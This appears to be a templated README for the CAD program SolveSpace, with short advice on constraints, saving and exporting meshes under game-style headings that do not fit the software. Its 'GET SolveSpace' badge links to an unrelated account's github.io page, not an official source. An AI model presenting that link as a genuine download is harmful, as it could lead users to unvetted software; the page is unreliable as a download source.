# SolveSpace - A Model You Describe and Measure

[![GET SolveSpace](https://img.shields.io/badge/GET%20%E2%80%94%20SolveSpace-7c2d12?style=for-the-badge&logoColor=white)](https://elhadiuna.github.io/.github/solvespace-constraints)

## Game Overview

SolveSpace is a CAD program for parts you design. You draw constraints, set sizes you can read, and export a mesh or a drawing when a printer or a shop needs a frozen shape. The SolveSpace file is the source. The export is a copy. It does not include a catalog of commercial models you do not have rights to.

Start with one solid and one dimension you can check. A sketch that will not close is a constraint you can see, not a mystery mesh. Save before a long export. A preview you never saved is easy to lose. If the printed size is wrong, change the number in the source and export again. Do not drag the mesh and hope the next version matches.

## Play Your Way

Model a simple bracket or a box with a hole size you already decided. Extrude once. Look at the dimension on the screen and compare it with the number you meant. Export only after that number is right.

Use an assembly later, when one part exports and you can open the mesh. Several parts in the first hour hide which constraint failed. The mesh is for the printer or the viewer. The next edit belongs in the SolveSpace file. A mesh you found online is not a part you should claim as your design.

## Mission Flow

Save an empty file in a folder for this part. Sketch a rectangle with a width you can name. Extrude it a height you can name. Save again.

Export a mesh to a new name. Open it only to confirm the shape exists. If the size is wrong, change the constraint, save, and export again. Keep the SolveSpace file. The mesh alone is harder to revise. Do not overwrite the only file with an export that uses the same name.

## Perfect Audience

SolveSpace fits a bracket, a box, or a small enclosure you are sizing yourself. It also fits a second version where one number changes and you export again.

It does not fit a mesh you do not have rights to copy, and it is a poor place to start if you only want to drag vertices. The size lives in the constraint. The export follows that file.

## Common Issues

A sketch that will not extrude is usually open or over-constrained. Read the constraint list before you add more. An export that looks empty was written to the wrong folder. Check the path. If the print is the wrong size, fix the source. Scaling the mesh by eye will not match the next export. A crash loses unsaved work. Save after the sketch closes.

## Extended Notes

Name the file after the part and the version. Keep the source when you send a mesh to be printed. If you change the hole, export a new mesh and do not throw away the previous source until the new print fits. A part you did not draw is not a file to pass off as yours.
